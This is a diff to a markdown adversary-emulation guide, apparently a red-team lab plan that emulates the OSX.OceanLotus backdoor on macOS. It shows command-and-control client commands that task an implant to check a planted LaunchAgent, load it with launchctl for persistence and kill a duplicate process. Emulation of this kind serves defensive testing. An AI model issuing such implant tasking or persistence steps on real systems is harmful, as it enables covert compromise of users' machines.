@@ -155,21 +155,8 @@ Open **four** terminal windows on your local machine (assuming a macOS or simila
 
    >The Dock is the macOS version of a Windows toolbar, Finder is the macOS version of Windows Explorer, and the Downloads folder is typically located to the left side of the Trash icon in the Dock.
 
-1. Verify the conkylan.app file (unicorn in Vietnamese) is present in the Downloads folder. 
+1. Verify the conkylan.app file (unicorn in Vietnamese) is present in the Downloads folder (if not present, use the [set up](../Resources/setup) documentation to finish set up).
 
-<details><summary>Troubleshooting</summary>
-  
-   If you receive this error...
-   ```
-   LSOpenURLsWithRole() failed with error -610 for the URL vnc://localhost:5900.
-   ```
-   
-   Try blah.
-   ```
-   Insert solution here
-   ```
-   
-</details>
 
 ## Step 1 - Establish Foothold
 ### 📖 Overview
@@ -242,48 +229,56 @@ The Implant is a fat binary that performs the backdoor capabilities. On executio
    ```
    
  1. Verify the persistence file was dropped by the initial payloads.
+   
    ```
    ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"ls -la /Users/hpotter/Library/LaunchAgents/com.apple.launchpad"}'
    ```
    
    Expected Output: 
    ```
-   [SUCCESS] 2023/08/24 19:21:26 Successfully set task for session: b6dbd70f203515095d0ca8a5ecbb43f7
-   [Task] 2023/08/24 19:21:32 total 8
-   ...
-   rw-r--r--  1 hpotter  VISERION\Domain Users  456 Aug 24 19:21 com.apple.launchpad.plist
-   [SUCCESS] 2023/08/24 19:21:32 Successfully set task output.
+      [SUCCESS] 2023/08/24 19:21:26 Successfully set task for session: b6dbd70f203515095d0ca8a5ecbb43f7
+      [Task] 2023/08/24 19:21:32 total 8
+      ...
+      rw-r--r--  1 hpotter  VISERION\Domain Users  456 Aug 24 19:21 com.apple.launchpad.plist
+      [SUCCESS] 2023/08/24 19:21:32 Successfully set task output.
    ```
 
 
-   <details><summary>Extra Credit - Execute Persistence</summary>
-     
-      This is not part of the emulation plan however, if you want to manually verify the LaunchAgent works you can use `launchctl` to manually load and execute the LaunchAgent. macOS loads and excecutes LaunchAgents upon user logon, therefore it would be abnormal for the adversary to arbitrarily execute a LaunchAgent when there is an established session. 
-      
-      The below commands will allow you to manually load the `OSX.OceanLotus` LaunchAgent.
-      
-      Note: As a result of our decision to hardcode the implant UUIDs to enable the copy/paste approach for this emulation there are additional actions that must be taken for session management. Loading the LaunchAgent will result in a double session. 
-      
-      1. Load the LaunchAgent using `launchctl`
-         ```
-         ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"launchctl load -w /Users/hpotter/Library/LaunchAgents/com.apple.launchpad"}'
-         ````
-      1. List out the processes using the com.apple.launchpad plist
-         ```
-         ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"ps -ef | grep com.apple.launchpad"}'
-         ```
-      1. Identify the process that is NOT running with the parent process of `1`. Using this process's PID, replace `PID` in the below command to kill this process.
-         ```
-         ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"kill -9 PID"}'
-         ```
-      
-      1. Veify we only have one running process using the com.apple.launchpad plist.
-         ```
-         ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"ps -ef | grep com.apple.launchpad"}'
-         ```
-      1. Continue hacking...
+<details><summary>Extra Credit - Execute Persistence</summary>
 
-   </details>
+   This is not part of the emulation plan however, if you want to manually verify the LaunchAgent works you can use `launchctl` to manually load and execute the LaunchAgent. macOS loads and excecutes LaunchAgents upon user logon, therefore it would be abnormal for the adversary to arbitrarily execute a LaunchAgent when there is an established session. 
+   
+   The below commands will allow you to manually load the `OSX.OceanLotus` LaunchAgent.
+   
+   Note: As a result of our decision to hardcode the implant UUIDs to enable the copy/paste approach for this emulation there are additional actions that must be taken for session management. Loading the LaunchAgent will result in a double session. 
+   
+   1. Load the LaunchAgent using `launchctl`
+   
+      ```
+      ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"launchctl load -w /Users/hpotter/Library/LaunchAgents/com.apple.launchpad"}'
+      ````
+   
+   1. List out the processes using the com.apple.launchpad plist
+   
+      ```
+      ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"ps -ef | grep com.apple.launchpad"}'
+      ```
+   
+   1. Identify the process that is NOT running with the parent process of `1`. Using this process's PID, replace `PID` in the below command to kill this process.
+   
+      ```
+      ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"kill -9 PID"}'
+      ```
+   
+   1. Veify we only have one running process using the com.apple.launchpad plist.
+   
+      ```
+      ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"ps -ef | grep com.apple.launchpad"}'
+      ```
+   
+   1. Continue hacking...
+   
+</details>
    
 <br>
 
